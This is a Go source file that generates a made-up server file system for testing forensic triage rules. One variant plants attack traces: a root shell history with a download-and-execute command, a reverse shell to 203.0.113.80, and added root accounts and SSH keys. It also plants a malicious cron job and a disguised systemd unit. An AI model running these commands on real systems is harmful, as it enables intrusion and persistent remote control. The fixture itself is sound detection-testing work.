package scenario

import (
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io/fs"
	"math/rand"
	"os"
	"path"
	"sort"
	"strings"
	"time"
)

// HostFile is one file of a synthetic system.
type HostFile struct {
	Text     string
	Modified time.Time
	// Link makes the file a link to this target, with no text.
	Link string
}

// Host is the file system of the same small server as Generate makes logs for, after the same day:
// its logs, and the artifacts that a forensic triage reads. Everything is made up.
type Host struct {
	// Files maps a path to a file. Paths under "root/" are the system. "snapshots/" holds the output of ps and ss.
	Files    map[string]HostFile
	Expected []Expected
	// KnownMisses describes what is in the system and gives no alert.
	KnownMisses []string
}

// fakeKey makes a public key line that has the right shape and belongs to nobody.
func fakeKey(random *rand.Rand, comment string) string {
	const kind = "ssh-ed25519"
	blob := binary.BigEndian.AppendUint32(nil, uint32(len(kind)))
	blob = append(blob, kind...)
	blob = binary.BigEndian.AppendUint32(blob, 32)
	for index := 0; index < 32; index++ {
		blob = append(blob, byte(random.Intn(256)))
	}

	return kind + " " + base64.StdEncoding.EncodeToString(blob) + " " + comment
}

// GenerateHost makes the system. With attacks false it is the server on an ordinary day, with the things
// that look odd and are not: a cron job with curl, a job that cleans /tmp, a key with a forced command.
func GenerateHost(seed int64, day time.Time, attacks bool) Host {
	logs := Generate(seed, day, attacks)
	random := rand.New(rand.NewSource(seed + 7919))
	installed := day.AddDate(0, 0, -40)
	evening := day.Add(23*time.Hour + 30*time.Minute)
	at := func(hour, minute, second int) time.Time {
		return day.Add(time.Duration(hour)*time.Hour + time.Duration(minute)*time.Minute + time.Duration(second)*time.Second)
	}

	host := Host{Files: map[string]HostFile{}, Expected: append([]Expected{}, logs.Expected...), KnownMisses: append([]string{}, logs.KnownMisses...)}
	put := func(name, text string, modified time.Time) {
		host.Files[name] = HostFile{Text: text, Modified: modified}
	}

	put("root/var/log/auth.log", logs.Files["auth.log"], evening)
	put("root/var/log/nginx/access.log", logs.Files["access.log"], evening)

	passwd := []string{
		"root:x:0:0:root:/root:/bin/bash", "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
		"backup:x:34:34:backup:/var/backups:/bin/sh", "sshd:x:105:65534::/run/sshd:/usr/sbin/nologin", "sync:x:4:65534:sync:/bin:/bin/sync",
	}
	users := []string{"aiko", "kenji", "mei", "haruto"}
	for index, user := range users {
		passwd = append(passwd, fmt.Sprintf("%s:x:%d:%d:%s:/home/%s:/bin/bash", user, 1000+index, 1000+index, strings.ToUpper(user[:1])+user[1:], user))
		put("root/home/"+user+"/.ssh/authorized_keys", fakeKey(random, user+"@laptop")+"\n", installed)
	}
	put("root/home/aiko/.ssh/authorized_keys", "# work laptop\n"+fakeKey(random, "aiko@laptop")+"\n"+
		`command="/usr/bin/rrsync -ro /srv/www",no-pty,no-port-forwarding `+fakeKey(random, "backup@nas")+"\n", installed)

	put("root/etc/crontab", "# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n"+
		"17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }\n", installed)
	put("root/etc/cron.d/backup", "MAILTO=\"\"\n0 3 * * * backup /usr/local/bin/backup.sh && curl -fsS -m 10 https://hc.example.test/ping/backup > /dev/null\n"+
		"30 4 * * 0 root find /tmp -type f -mtime +7 -delete\n", installed)
	put("root/etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n", installed)
	put("root/var/spool/cron/crontabs/aiko", "# m h dom mon dow command\n*/15 * * * * /home/aiko/bin/sync-reports.sh | logger -t reports\n", installed)

	put("root/etc/systemd/system/app.service", "[Unit]\nDescription=Example application\nAfter=network.target\n\n[Service]\nUser=www-data\n"+
		"Environment=TMPDIR=/tmp\nExecStart=/usr/bin/env TMPDIR=/tmp /opt/app/bin/server --config /etc/app.toml\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\n", installed)
	put("root/etc/systemd/system/certbot-renew.service", "[Unit]\nDescription=Renew certificates\n\n[Service]\nType=oneshot\nExecStart=-/usr/bin/certbot renew --quiet\nExecStartPost=/usr/bin/systemctl reload nginx\n", installed)

	put("root/home/aiko/.bash_history", strings.Join([]string{
		"sudo systemctl status nginx", "sudo tail -f /var/log/auth.log", "history | grep ssh", "curl -O https://example.test/app-1.2.tar.gz",
		"tar xzf app-1.2.tar.gz", "nc -zv db.example.test 5432", "cat ~/.ssh/authorized_keys", "vim /tmp/notes.txt", "grep sshd /var/log/auth.log > /tmp/sshd.txt",
		"curl -s https://example.test/api/items | jq .", "rm /var/log/nginx/access.log.5.gz", "export HISTSIZE=10000", "exit",
	}, "\n")+"\n", at(18, 40, 0))
	zsh := ""
	for index, command := range []string{"cd /srv/www", "git pull", "sudo systemctl reload nginx", "df -h", "timeout 1 bash -c '</dev/tcp/db.example.test/5432' && echo open", "ls -la /tmp"} {
		zsh += fmt.Sprintf(": %d:0;%s\n", at(9, 10+index*3, random.Intn(60)).Unix(), command)
	}
	put("root/home/kenji/.zsh_history", zsh, at(9, 30, 0))
	put("root/etc/passwd", strings.Join(passwd, "\n")+"\n", installed)

	processes := []string{
		"USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
		"root           1  0.0  0.1 168000 11000 ?        Ss   Oct01   0:09 /sbin/init",
		"root           2  0.0  0.0      0     0 ?        S    Oct01   0:00 [kthreadd]",
		"root         812  0.0  0.1  15000  9000 ?        Ss   Oct01   0:02 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
		"root         901  0.0  0.2  60000 12000 ?        Ss   Oct01   0:01 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;",
		"www-data     902  0.1  0.5  61000 20000 ?        S    Oct01   3:11 nginx: worker process",
		"www-data    1140  0.3  2.1 720000 86000 ?        Ssl  Oct01  12:40 /opt/app/bin/server --config /etc/app.toml",
		"aiko        4411  0.0  0.1  12000  6000 pts/0    S+   18:38   0:00 vim /tmp/notes.txt",
	}
	sockets := []string{
		"Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process",
		`udp   UNCONN 0      0          127.0.0.53%lo:53         0.0.0.0:*     users:(("systemd-resolve",pid=600,fd=13))`,
		`tcp   LISTEN 0      128              0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=812,fd=3))`,
		`tcp   LISTEN 0      511              0.0.0.0:80         0.0.0.0:*     users:(("nginx",pid=901,fd=6),("nginx",pid=902,fd=6))`,
		`tcp   LISTEN 0      4096           127.0.0.1:8080       0.0.0.0:*     users:(("server",pid=1140,fd=7))`,
		`tcp   LISTEN 0      128                 [::]:22            [::]:*     users:(("sshd",pid=812,fd=4))`,
	}

	if attacks {
		// What the address that guessed the password of root left behind, in the order in which it was done.
		passwd = append(passwd, "support2:x:1004:1004::/home/support2:/bin/bash", "sysupd:x:0:0::/root:/bin/bash")
		put("root/etc/passwd", strings.Join(passwd, "\n")+"\n", at(2, 15, 2))
		key := fakeKey(random, "user@host")
		put("root/root/.ssh/authorized_keys", key+"\n", at(2, 13, 40))
		history := ""
		for index, command := range []string{
			"id", "uname -a", "cat /etc/passwd", "echo '" + key + "' >> /root/.ssh/authorized_keys", "useradd -m -s /bin/bash support2", "usermod -aG sudo support2",
			"echo 'sysupd:x:0:0::/root:/bin/bash' >> /etc/passwd", "curl -fsSL http://203.0.113.80/u.sh | sh", "crontab -e",
			"bash -i >& /dev/tcp/203.0.113.80/4444 0>&1", "cat /dev/null > /var/log/wtmp", "unset HISTFILE",
		} {
			history += fmt.Sprintf("#%d\n%s\n", at(2, 12, 30+index*25).Unix(), command)
		}
		put("root/root/.bash_history", history, at(2, 18, 0))
		host.Files["root/home/support2/.bash_history"] = HostFile{Link: "/dev/null", Modified: at(2, 15, 30)}
		put("root/var/spool/cron/crontabs/root", "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n*/30 * * * * curl -fsSL http://203.0.113.80/u.sh | sh\n", at(2, 16, 23))
		put("root/etc/cron.d/0hourly-sync", "@reboot root /dev/shm/.x/kworker -B\n", at(2, 17, 5))
		put("root/etc/systemd/system/dbus-helper.service", "[Unit]\nDescription=D-Bus helper\n\n[Service]\nExecStart=/var/tmp/.dbus/helper --daemon\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n", at(2, 17, 40))
		processes = append(processes,
			"root        7731  1.9  0.3  24000 14000 ?        Sl   02:17   21:02 /dev/shm/.x/kworker -B",
			"root        7740  0.0  0.1  18000  7000 ?        S    02:18   0:00 /var/tmp/.dbus/helper --daemon")
		sockets = append(sockets, `tcp   LISTEN 0      5                0.0.0.0:31337      0.0.0.0:*     users:(("kworker",pid=7731,fd=3))`)

		for _, rule := range []string{
			"forensics_history_key_added", "forensics_history_download_exec", "forensics_history_reverse_shell", "forensics_history_log_tamper",
			"forensics_history_hidden", "forensics_cron_download_exec", "forensics_cron_temp_program", "forensics_unit_suspicious_exec",
			"forensics_extra_root_account", "forensics_process_unusual_program",
		} {
			host.Expected = append(host.Expected, Expected{Rule: rule})
		}
		host.KnownMisses = append(host.KnownMisses,
			"the key in /root/.ssh/authorized_keys is listed with its fingerprint and gives no alert by itself: only the command that added it does",
			"the listening port 31337 of the process from /dev/shm is listed and gives no alert by itself")
	}
	put("snapshots/ps.txt", strings.Join(processes, "\n")+"\n", evening)
	put("snapshots/ss.txt", strings.Join(sockets, "\n")+"\n", evening)

	return host
}

// WriteHost writes the system into a folder that does not exist yet. Nothing outside of it is touched,
// and an existing folder is refused, so nothing is written over.
func WriteHost(folder string, host Host) error {
	if err := os.Mkdir(folder, 0o700); err != nil {
		if errors.Is(err, fs.ErrExist) {
			return errors.New("the folder exists already")
		}

		return errors.New("the folder cannot be made")
	}
	root, err := os.OpenRoot(folder)
	if err != nil {
		return errors.New("the folder cannot be opened")
	}
	defer root.Close()

	names := make([]string, 0, len(host.Files))
	for name := range host.Files {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		file := host.Files[name]
		if !fs.ValidPath(name) {
			return fmt.Errorf("the path %q is not valid", name)
		}
		if err := root.MkdirAll(path.Dir(name), 0o700); err != nil {
			return fmt.Errorf("%s: the folder cannot be made", name)
		}
		if file.Link != "" {
			if err := root.Symlink(file.Link, name); err != nil {
				return fmt.Errorf("%s: the link cannot be made", name)
			}
			continue
		}
		opened, err := root.OpenFile(name, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o600)
		if err != nil {
			return fmt.Errorf("%s: the file cannot be made", name)
		}
		_, writeErr := opened.WriteString(file.Text)
		if closeErr := opened.Close(); writeErr != nil || closeErr != nil {
			return fmt.Errorf("%s: the file cannot be written", name)
		}
		// The time of the last change is part of the scenario: the timeline of the triage is built from it.
		if err := root.Chtimes(name, file.Modified, file.Modified); err != nil {
			return fmt.Errorf("%s: the time cannot be set", name)
		}
	}

	return nil
}
